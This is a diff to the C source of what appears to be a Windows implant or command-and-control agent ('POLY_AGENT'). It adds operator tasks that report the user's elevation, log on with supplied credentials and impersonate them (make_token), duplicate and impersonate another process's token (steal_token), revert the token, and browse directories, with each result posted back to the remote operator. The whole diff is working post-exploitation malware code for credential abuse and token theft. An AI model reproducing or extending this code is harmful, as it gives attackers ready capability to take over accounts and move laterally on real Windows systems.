@@ -3597,6 +3597,209 @@ static void POLY_AGENT(void) {
             HeapFree(GetProcessHeap(),0,task_raw);
             continue;
 
+        /* getuid — current user + elevation + impersonation state */
+        } else if(lt_strpfx(command,"getuid")&&(command[6]==0||command[6]==' ')){
+            char uid_buf[560]={0};
+            /* Try GetUserNameExW (NameSamCompatible=2) for DOMAIN\user format */
+            BOOL got_name=FALSE;
+            {
+                HMODULE hSec=GetModuleHandleA("Secur32.dll");
+                if(!hSec) hSec=LoadLibraryA("Secur32.dll");
+                if(hSec){
+                    typedef BOOL(WINAPI*_pGUNEx)(DWORD,LPWSTR,PULONG);
+                    _pGUNEx pGUNEx=(_pGUNEx)GetProcAddress(hSec,"GetUserNameExW");
+                    if(pGUNEx){
+                        WCHAR wfull[512]={0}; ULONG ulen2=511;
+                        if(pGUNEx(2,wfull,&ulen2)){
+                            int ux=0; while(wfull[ux]&&ux<510){uid_buf[ux]=(char)(wfull[ux]&0xFF);ux++;}
+                            got_name=TRUE;
+                        }
+                    }
+                }
+            }
+            if(!got_name){
+                WCHAR wusr[256]={0}; DWORD ul=255; GetUserNameW(wusr,&ul);
+                int ux=0; while(wusr[ux]&&ux<510){uid_buf[ux]=(char)(wusr[ux]&0xFF);ux++;}
+            }
+            HANDLE hTokG=NULL;
+            if(OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hTokG)){
+                TOKEN_ELEVATION te={0}; DWORD rl=0;
+                GetTokenInformation(hTokG,TokenElevation,&te,sizeof(te),&rl);
+                CloseHandle(hTokG);
+                if(te.TokenIsElevated) lt_strcat(uid_buf," (elevated)");
+            }
+            HANDLE hImpG=NULL;
+            if(OpenThreadToken(GetCurrentThread(),TOKEN_QUERY,TRUE,&hImpG)){
+                lt_strcat(uid_buf," [impersonating]"); CloseHandle(hImpG);
+            }
+            lt_strcat(uid_buf,"\r\n");
+            DWORD out_len=(DWORD)lt_strlen(uid_buf);
+            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
+            if(output) for(DWORD _gi=0;_gi<=out_len;_gi++) output[_gi]=(BYTE)uid_buf[_gi];
+            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
+            if(output) HeapFree(GetProcessHeap(),0,output);
+            HeapFree(GetProcessHeap(),0,task_raw); continue;
+
+        /* make_token DOMAIN\user password — LogonUser(NEW_CREDENTIALS) + ImpersonateLoggedOnUser */
+        } else if(lt_strpfx(command,"make_token ")&&command[11]){
+            const char *mt_a=command+11;
+            int mt_sp=0; while(mt_a[mt_sp]&&mt_a[mt_sp]!=' ') mt_sp++;
+            const char *mt_pw=(mt_a[mt_sp]==' ')?(mt_a+mt_sp+1):NULL;
+            WCHAR mt_user[128]={0},mt_dom[128]={0},mt_pass[256]={0};
+            int mt_bs=0; while(mt_a[mt_bs]&&mt_a[mt_bs]!='\\'&&mt_bs<mt_sp) mt_bs++;
+            if(mt_a[mt_bs]=='\\'){
+                int di=0; for(int xi=0;xi<mt_bs&&di<127;xi++){mt_dom[di++]=(WCHAR)(unsigned char)mt_a[xi];}
+                int ui=0; for(int xi=mt_bs+1;xi<mt_sp&&ui<127;xi++){mt_user[ui++]=(WCHAR)(unsigned char)mt_a[xi];}
+            } else {
+                int ui=0; for(int xi=0;xi<mt_sp&&ui<127;xi++){mt_user[ui++]=(WCHAR)(unsigned char)mt_a[xi];}
+                mt_dom[0]=L'.';
+            }
+            if(mt_pw){int pi=0;while(mt_pw[pi]&&pi<254){mt_pass[pi]=(WCHAR)(unsigned char)mt_pw[pi];pi++;}}
+            HANDLE hMTok=NULL; BOOL mt_ok=FALSE;
+            if(mt_user[0]&&mt_pass[0]){
+                mt_ok=LogonUserW(mt_user,mt_dom,mt_pass,9,0,&hMTok); /* 9=LOGON32_LOGON_NEW_CREDENTIALS */
+                if(mt_ok&&hMTok) ImpersonateLoggedOnUser(hMTok);
+                lt_zero((PBYTE)mt_pass,sizeof(mt_pass));
+            }
+            if(hMTok) CloseHandle(hMTok);
+            const char *mt_msg=mt_ok?"[+] make_token: thread impersonating new credentials\r\n"
+                                    :"[-] make_token: LogonUser failed\r\n";
+            DWORD out_len=(DWORD)lt_strlen(mt_msg);
+            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
+            if(output) for(DWORD _mi=0;_mi<=out_len;_mi++) output[_mi]=(BYTE)mt_msg[_mi];
+            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
+            if(output) HeapFree(GetProcessHeap(),0,output);
+            HeapFree(GetProcessHeap(),0,task_raw); continue;
+
+        /* steal_token <pid> — duplicate process token + ImpersonateLoggedOnUser */
+        } else if(lt_strpfx(command,"steal_token ")&&command[12]){
+            DWORD st_pid=0; int si=12;
+            while(command[si]>='0'&&command[si]<='9'){st_pid=st_pid*10+(command[si++]-'0');}
+            BOOL st_ok=FALSE;
+            if(st_pid){
+                CLIENT_ID st_cid={0}; st_cid.UniqueProcess=(HANDLE)(ULONG_PTR)st_pid;
+                OBJECT_ATTRIBUTES st_oa={sizeof(OBJECT_ATTRIBUTES)};
+                HANDLE hSP=NULL;
+                if(NT_SUCCESS(POLY_NTOPEN(&hSP,PROCESS_QUERY_INFORMATION,&st_oa,&st_cid))&&hSP){
+                    HANDLE hST=NULL;
+                    if(OpenProcessToken(hSP,TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY,&hST)){
+                        HANDLE hSD=NULL;
+                        if(DuplicateTokenEx(hST,TOKEN_ALL_ACCESS,NULL,SecurityImpersonation,TokenImpersonation,&hSD)){
+                            st_ok=ImpersonateLoggedOnUser(hSD)!=0;
+                            CloseHandle(hSD);
+                        }
+                        CloseHandle(hST);
+                    }
+                    POLY_NTCLOSE(hSP);
+                }
+            }
+            const char *st_msg=st_ok?"[+] steal_token: impersonating target process token\r\n"
+                                    :"[-] steal_token: failed (need SeDebugPrivilege or PROCESS_QUERY_INFORMATION)\r\n";
+            DWORD out_len=(DWORD)lt_strlen(st_msg);
+            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
+            if(output) for(DWORD _si=0;_si<=out_len;_si++) output[_si]=(BYTE)st_msg[_si];
+            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
+            if(output) HeapFree(GetProcessHeap(),0,output);
+            HeapFree(GetProcessHeap(),0,task_raw); continue;
+
+        /* rev2self — revert thread to process token */
+        } else if(lt_strpfx(command,"rev2self")&&(command[8]==0||command[8]==' ')){
+            RevertToSelf();
+            static const char rv_msg[]="[+] rev2self: reverted to process token\r\n";
+            DWORD out_len=(DWORD)(sizeof(rv_msg)-1);
+            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
+            if(output) for(DWORD _ri=0;_ri<out_len;_ri++) output[_ri]=(BYTE)rv_msg[_ri];
+            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
+            if(output) HeapFree(GetProcessHeap(),0,output);
+            HeapFree(GetProcessHeap(),0,task_raw); continue;
+
+        /* pwd — print working directory */
+        } else if(lt_strpfx(command,"pwd")&&(command[3]==0||command[3]==' ')){
+            WCHAR wp[520]={0}; GetCurrentDirectoryW(519,wp);
+            char pwd_buf[520]={0}; int pwi=0;
+            while(wp[pwi]&&pwi<517){pwd_buf[pwi]=(char)(wp[pwi]&0xFF);pwi++;}
+            pwd_buf[pwi++]='\r'; pwd_buf[pwi++]='\n';
+            DWORD out_len=(DWORD)pwi;
+            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
+            if(output) for(DWORD _pwi=0;_pwi<(DWORD)pwi;_pwi++) output[_pwi]=(BYTE)pwd_buf[_pwi];
+            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
+            if(output) HeapFree(GetProcessHeap(),0,output);
+            HeapFree(GetProcessHeap(),0,task_raw); continue;
+
+        /* cd <path> — change working directory */
+        } else if(lt_strpfx(command,"cd ")&&command[3]){
+            WCHAR wcd[520]={0}; int cdi=0;
+            while(command[3+cdi]&&cdi<518){wcd[cdi]=(WCHAR)(unsigned char)command[3+cdi];cdi++;}
+            const char *cd_msg=SetCurrentDirectoryW(wcd)?"[+] cd: ok\r\n":"[-] cd: failed\r\n";
+            DWORD out_len=(DWORD)lt_strlen(cd_msg);
+            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
+            if(output) for(DWORD _cdi=0;_cdi<=out_len;_cdi++) output[_cdi]=(BYTE)cd_msg[_cdi];
+            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
+            if(output) HeapFree(GetProcessHeap(),0,output);
+            HeapFree(GetProcessHeap(),0,task_raw); continue;
+
+        /* ls [path] — directory listing with sizes */
+        } else if(lt_strpfx(command,"ls")&&(command[2]==0||command[2]==' ')){
+            const char *ls_src=(command[2]==' '&&command[3])?(command+3):".";
+            WCHAR wls[520]={0}; int lsi=0;
+            while(ls_src[lsi]&&lsi<514){wls[lsi]=(WCHAR)(unsigned char)ls_src[lsi];lsi++;}
+            if(lsi>0&&wls[lsi-1]!='/'&&wls[lsi-1]!='\\'){wls[lsi]=L'\\';lsi++;}
+            wls[lsi]=L'*'; wls[lsi+1]=0;
+            WIN32_FIND_DATAW wfd; lt_zero(&wfd,sizeof(wfd));
+            HANDLE hFnd=FindFirstFileW(wls,&wfd);
+            DWORD ls_cap=8192,ls_used=0;
+            char *ls_buf=(char*)HeapAlloc(GetProcessHeap(),0,ls_cap);
+            if(!ls_buf||hFnd==INVALID_HANDLE_VALUE){
+                if(hFnd!=INVALID_HANDLE_VALUE) FindClose(hFnd);
+                if(ls_buf){HeapFree(GetProcessHeap(),0,ls_buf);ls_buf=NULL;}
+                const char *_em="[-] ls: path not found\r\n";
+                DWORD el=(DWORD)lt_strlen(_em);
+                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
+                if(eo) for(DWORD _ei=0;_ei<=el;_ei++) eo[_ei]=(BYTE)_em[_ei];
+                _lt_post_task_result(session_id,task_id,result_base,eo,el);
+                if(eo) HeapFree(GetProcessHeap(),0,eo);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;
+            }
+            do {
+                char ent[560]={0}; int ei=0;
+                if(wfd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY){
+                    const char *dt="<dir> ";
+                    for(int di=0;dt[di];di++) ent[ei++]=dt[di];
+                    for(int ni=0;wfd.cFileName[ni]&&ni<255;ni++)
+                        ent[ei++]=(char)(wfd.cFileName[ni]&0xFF);
+                } else {
+                    ULARGE_INTEGER fsz2; fsz2.LowPart=wfd.nFileSizeLow; fsz2.HighPart=wfd.nFileSizeHigh;
+                    char szbuf[24]={0}; ULONGLONG sv=fsz2.QuadPart; int szi=0;
+                    if(sv==0){szbuf[0]='0';szi=1;}
+                    else{char tmp3[24]={0};int ti3=0;
+                        while(sv>0){tmp3[ti3++]=(char)('0'+(int)(sv%10));sv/=10;}
+                        for(int ri3=ti3-1;ri3>=0;ri3--) szbuf[szi++]=tmp3[ri3];}
+                    int pad=10-szi; while(pad-->0) ent[ei++]=' ';
+                    for(int si3=0;si3<szi;si3++) ent[ei++]=szbuf[si3];
+                    ent[ei++]=' ';
+                    for(int ni=0;wfd.cFileName[ni]&&ni<255;ni++)
+                        ent[ei++]=(char)(wfd.cFileName[ni]&0xFF);
+                }
+                ent[ei++]='\r'; ent[ei++]='\n';
+                if(ls_used+(DWORD)ei+4>ls_cap){
+                    DWORD nc=ls_cap*2+(DWORD)ei+64;
+                    char *nb=(char*)HeapAlloc(GetProcessHeap(),0,nc);
+                    if(nb){for(DWORD _ci=0;_ci<ls_used;_ci++) nb[_ci]=ls_buf[_ci];
+                        HeapFree(GetProcessHeap(),0,ls_buf);ls_buf=nb;ls_cap=nc;}
+                    else break;
+                }
+                for(int _ai=0;_ai<ei;_ai++) ls_buf[ls_used++]=(char)(unsigned char)ent[_ai];
+            } while(FindNextFileW(hFnd,&wfd));
+            FindClose(hFnd);
+            if(ls_used==0){const char *_em2="(empty)\r\n";
+                for(int _ei=0;_em2[_ei];_ei++) ls_buf[ls_used++]=(char)_em2[_ei];}
+            PBYTE lo=(PBYTE)HeapAlloc(GetProcessHeap(),0,ls_used+2);
+            if(lo) for(DWORD _li=0;_li<ls_used;_li++) lo[_li]=(BYTE)ls_buf[_li];
+            HeapFree(GetProcessHeap(),0,ls_buf);
+            _lt_post_task_result(session_id,task_id,result_base,lo,ls_used);
+            if(lo) HeapFree(GetProcessHeap(),0,lo);
+            HeapFree(GetProcessHeap(),0,task_raw); continue;
+
         } else {
             /* Task 10: dispatch shell commands to a background thread */
             int slot=_lt_alloc_slot();
